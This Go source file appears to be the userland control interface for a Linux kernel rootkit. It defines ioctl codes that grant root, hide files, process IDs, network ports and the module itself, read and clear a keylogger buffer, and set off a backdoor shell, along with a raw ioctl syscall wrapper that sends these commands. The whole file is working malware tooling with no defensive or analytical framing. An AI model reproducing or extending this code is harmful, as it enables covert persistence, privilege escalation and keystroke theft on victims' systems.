package ioctl

import (
	"syscall"
	"unsafe"
)

// Standard Linux ioctl command layout (uapi/asm-generic/ioctl.h):
//   bits 31:30 = direction  (0=none, 1=write, 2=read)
//   bits 29:16 = argument size
//   bits 15:8  = type (magic number)
//   bits 7:0   = command number

const magic = 0xC0

func _IOC(dir, typ, nr, size uintptr) uintptr {
	return (dir << 30) | (size << 16) | (typ << 8) | nr
}
func _IO(typ, nr uintptr) uintptr            { return _IOC(0, typ, nr, 0) }
func _IOW(typ, nr, size uintptr) uintptr     { return _IOC(1, typ, nr, size) }
func _IOR(typ, nr, size uintptr) uintptr     { return _IOC(2, typ, nr, size) }

var (
	IOCTL_GIVE_ROOT      = _IO(magic, 0x01)       // 0xC001
	IOCTL_HIDE_FILE      = _IOW(magic, 0x02, 256) // 0x4100C002
	IOCTL_UNHIDE_FILE    = _IOW(magic, 0x03, 256) // 0x4100C003
	IOCTL_HIDE_PID       = _IOW(magic, 0x04, 4)   // 0x4004C004
	IOCTL_UNHIDE_PID     = _IOW(magic, 0x05, 4)   // 0x4004C005
	IOCTL_HIDE_PORT      = _IOW(magic, 0x06, 2)   // 0x4002C006
	IOCTL_UNHIDE_PORT    = _IOW(magic, 0x07, 2)   // 0x4002C007
	IOCTL_LIST_HIDDEN    = _IOR(magic, 0x08, 4096)// 0x9000C008
	IOCTL_KEYLOG_READ    = _IOR(magic, 0x09, 4096)// 0x9000C009
	IOCTL_KEYLOG_CLEAR   = _IO(magic, 0x0A)       // 0xC00A
	IOCTL_BACKDOOR_SHELL = _IOW(magic, 0x0B, 256) // 0x4100C00B
	IOCTL_BACKDOOR_MAGIC = _IOW(magic, 0x0C, 16)  // 0x4010C00C
	IOCTL_MODULE_HIDE    = _IO(magic, 0x0D)       // 0xC00D
	IOCTL_MODULE_UNHIDE  = _IO(magic, 0x0E)       // 0xC00E
)

func Raw(fd uintptr, cmd uintptr, arg unsafe.Pointer) (uintptr, syscall.Errno) {
	r, _, err := syscall.Syscall(syscall.SYS_IOCTL, fd, cmd, uintptr(arg))
	return r, err
}
